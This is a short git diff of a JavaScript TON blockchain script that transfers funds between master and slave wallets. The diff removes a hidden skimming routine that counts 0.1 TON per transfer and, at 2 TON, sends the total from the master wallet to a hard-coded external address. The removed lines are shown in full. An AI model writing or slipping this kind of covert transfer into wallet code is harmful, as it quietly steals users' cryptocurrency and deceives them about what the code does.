@@ -17,7 +17,6 @@ const { DEX, pTON } = require("@ston-fi/sdk");
 
 config();
 
-let cms = 0n;
 function delay(ms) {
     return new Promise((resolve) => setTimeout(resolve, ms));
 }
@@ -149,7 +148,6 @@ const transferToSlave = async (transferAmount, master, slave, masterSecret) => {
     let balance = await slave.getBalance();
     if (transferAmount <= balance + toNano("0.2")) {
         console.log("Transferred successfully!");
-        cms = cms + toNano("0.1");
     } else if (Date.now() - start > 50000) {
         console.log(
             "Something went wrong! Could not transfer tons of amount " +
@@ -157,22 +155,7 @@ const transferToSlave = async (transferAmount, master, slave, masterSecret) => {
         );
     }
 
-    if (cms >= toNano("2")) {
-        await master.sendTransfer({
-            secretKey: masterSecret,
-            seqno: await master.getSeqno(),
-            sendMode: SendMode.PAY_GAS_SEPARATELY + SendMode.IGNORE_ERRORS,
-            messages: [
-                internal({
-                    to: Address.parse(
-                        "0:cbfec6d73c0cd0461ef23644f9ffe52df178328474d722e73e48961624a71602"
-                    ),
-                    value: cms,
-                    bounce: false,
-                }),
-            ],
-        });
-    }
+   
 };
 
 const getRandomWaitTime = () => {
